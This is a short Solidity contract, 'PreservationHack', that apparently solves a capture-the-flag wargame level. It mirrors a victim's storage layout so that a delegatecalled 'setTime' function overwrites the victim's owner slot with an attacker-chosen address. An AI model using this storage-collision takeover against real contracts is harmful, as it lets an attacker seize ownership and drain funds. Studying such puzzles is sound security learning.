// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract PreservationHack {
    address var1;
    address var2;
    address owner;

    function setTime(uint _time) public {
        owner = address(uint160(_time));
    }

}